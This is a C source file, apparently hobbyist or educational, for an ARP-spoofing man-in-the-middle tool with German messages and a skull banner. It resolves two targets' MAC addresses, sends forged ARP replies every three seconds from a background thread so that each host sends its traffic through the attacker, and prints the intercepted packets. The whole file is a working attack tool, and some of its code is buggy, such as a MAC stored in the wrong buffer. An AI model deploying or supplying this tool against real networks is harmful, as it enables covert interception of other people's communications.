#include "header/arp.h"
#include <pcap.h>
#include "header/hacking.h"
#include <unistd.h>
#include <pthread.h>
#include <netinet/ether.h>


void set_packet_filter(pcap_t *handle, char *filter_opt);

void* arp_poison_thread(void *arg_ptr);

struct data_pass
{
    libnet_t* l;
    uint32_t target1_ip, target2_ip;
    uint8_t *target1_mac, *target2_mac;

};

void usage(char* name)
{
    printf("Usage: %s <IP of Target A> <IP of Target B>\n", name);
    exit(0);
}

char pic[] =
"                      ______\n"
"                   .-"      "-.\n"
"                  /           \\\n"
"                 |              |\n"
"                 |,  .-.  .-.  ,|\n"
"                 | )(_\e[0;31mo\033[39m/  \\\e[0;31mo\033[39m_)( |\n"
"                 |/     /\\     \\|\n"
"       (@_       (_     ^^     _)\n"
"  _     ) \\_______\\__|IIIIII|__/__________________________\n"
" (_)@8@8{}<________|-\\IIIIII/-|___________________________>\n"
"        )_/        \\          /\n"
"       (@           `--------`\n";


#define ARP_POISON_FREQUENCY 3

int main(int argc, char *argv[])
{
    libnet_t *l;
    pcap_t *handle;
    pcap_if_t *ift;
    struct pcap_pkthdr pkthdr;

    u_char errbuf[LIBNET_ERRBUF_SIZE];

    uint32_t target1_ip;
    uint32_t target2_ip;

    uint8_t *target1_mac;
    uint8_t *target2_mac;

    // Connection
    const u_char *packet;
    const u_char *data;
    char filter_str[200];
    const struct libnet_tcp_hdr *tcp_header;
    const struct libnet_ipv4_hdr *ip_header;

    // Multithreading
    struct data_pass poison_data;
    pthread_t t_poison;


    if(argc < 3)
        usage(argv[0]);

    /* Allocate memory for target macs*/
    target1_mac = ec_malloc(6);
    target2_mac = ec_malloc(6);

    l = libnet_init(LIBNET_LINK, NULL, errbuf);
    if(l == NULL)
        libnet_fatal(libnet_geterror(l));
    
    // Get device name
    if(pcap_findalldevs(&ift, (char *)(&errbuf)) == -1)
        fatal("suchen von Netzwerkgeräten");
    
    // Convert Targets ASCII-IP's to Numbers
    if(((target1_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE)) ==  -1) 
    || ((target2_ip = libnet_name2addr4(l, argv[2], LIBNET_DONT_RESOLVE)) ==  -1))
        fatal(libnet_geterror(l));
    
    

    printf("Netzwerkschnittstelle ist %s\n", ift->name);
    

     /* Open device for live capture */
     handle = pcap_open_live(ift->name, 4096, 1, 200, errbuf);
     if(handle == NULL)
        fatal("opening live session");
    
    /* 
        Get MAC-Addresses from Targets 
    */

    // Set packet filter for incoming ARP-Packets
    set_packet_filter(handle, "arp");
    
    // Request Target 1
    printf("\nZiel \033[32m%s\033[39m: sende ARP-requests... \n", argv[1]);
    arp_request(target1_ip, l);

    // Receive Target 1
    printf("\033[32m%s\033[39m: suche nach ARP-replys...\n", argv[1]);

    /* Loop goes on until a matching ARP-reply is found */

    while(arp_receive(handle, target1_ip, target2_mac) != 0) {sleep(1); arp_request(target1_ip, l);}
    
    printf("\n-------------------------------\n\n");

    // Request Target 2
    printf("\033[34m%s\033[39m: sende ARP-requests... \n", argv[2]);
    arp_request(target2_ip, l);

    // Receive Target 2
    printf("\033[34m%s\033[39m: suche nach ARP-replys...\n", argv[2]);
    while(arp_receive(handle, target2_ip, target2_mac) != 0) {sleep(1); arp_request(target2_ip, l);}

    /* 
        Start ARP-Poisoning on different thread
    */  

    printf("\n\t sendet ARP-Replies aller %d Sekunden. ^^\n%s\n", ARP_POISON_FREQUENCY, pic);

    poison_data.l = l;
    poison_data.target1_ip = target1_ip;
    poison_data.target2_ip = target2_ip;
    poison_data.target1_mac = target1_mac;
    poison_data.target2_mac = target2_mac;

    // create new thread for executing the arp_poison function
    pthread_create(&t_poison, NULL, arp_poison_thread , (void *)&poison_data);

    // make filter for tcp
    strcpy(filter_str, "(src host ");
    strcat(filter_str, argv[1]);
    strcat(filter_str, " or dst host "); 
    strcat(filter_str, argv[2]);
    strcat(filter_str, ") and (src host ");
    strcat(filter_str, argv[1]);
    strcat(filter_str, " or src host ");
    strcat(filter_str, argv[2]);
    strcat(filter_str, ")");
    // Set packet filter for TCP
    set_packet_filter(handle, filter_str);
    //set_packet_filter(handle, "tcp"); // just for testing

    // main loop intercepting packets and displaying them
    while(1)
    {
        packet = pcap_next(handle, &pkthdr);
        printf("got %d bytes packet\n", pkthdr.len);
        ip_header = (struct libnet_ipv4_hdr *)(packet + ETHER_HDR_LEN + 2); // no idea why it is off by 2
        tcp_header = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + LIBNET_IPV4_H);
        if(pkthdr.len == 0) continue;

        // Print if it came from Target 1 or 2
        
        if(ip_header->ip_src.s_addr == target1_ip)
            printf("\033[32m%s\033[39m", argv[1]);
    
        if(ip_header->ip_src.s_addr == target2_ip)
            printf("\033[34m%s\033[39m", argv[2]);

        
        fflush(stdout);
            
        for(int i = 0; i < pkthdr.len; i++)
        {
            if(*(packet + i) < 31 || *(packet + i) > 127) // non printable characters
                printf(".");
            else
                printf("%c", *(packet + i));
        }
        printf("\n");
        //fflush(stdout);
    }
    
}

void set_packet_filter(pcap_t *handle, char *filter_opt)
{
    struct bpf_program filter;
    char filter_string[200];
    strncpy(filter_string, filter_opt, 200);
    printf("[DEBUG] filter string ist %s\n", filter_string);

    if(pcap_compile(handle, &filter, filter_string, 0, 0) == -1)
    {
        perror("compile filter error");
        exit(EXIT_FAILURE);
    }

    if(pcap_setfilter(handle, &filter) == -1)
    {
        perror("setting filter error");
        exit(EXIT_FAILURE);
    }

}

void * arp_poison_thread(void *arg_ptr)
{

    struct data_pass *passed_data = arg_ptr;
    while(1) 
    {
        sleep(ARP_POISON_FREQUENCY);
        //send a fake arp-reply to target 1 pretending to be target 2
        arp_reply(passed_data->target2_ip, passed_data->target1_ip, passed_data->target1_mac, passed_data->l);
        //send a fake arp-reply to target 2 pretending to be target 1
        arp_reply(passed_data->target1_ip, passed_data->target2_ip, passed_data->target2_mac, passed_data->l);
    }
}